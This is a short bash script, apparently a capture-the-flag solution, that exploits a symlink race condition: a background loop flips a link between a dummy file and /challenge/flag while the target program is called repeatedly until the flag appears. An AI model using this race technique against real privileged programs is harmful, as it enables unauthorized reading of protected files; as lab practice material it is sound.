#!/bin/bash

TARGET_PROGRAM="/challenge/challenge"
SYMLINK="pointer"
GOODFILE="dummy"
BADFILE="/challenge/flag"

touch "$GOODFILE"

# Hammer the symlink in the background
(
    while true; do
        ln -sf "$GOODFILE" "$SYMLINK"
        ln -sf "$BADFILE" "$SYMLINK"
    done
) &

HAMMER_PID=$!

# Continuously call the program
while true; do
   OUTPUT=$(echo "$SYMLINK" | $TARGET_PROGRAM )

    echo "$OUTPUT"

    if echo "$OUTPUT" | grep -q "SSof{"; then
        kill $HAMMER_PID
        exit 0
    fi
done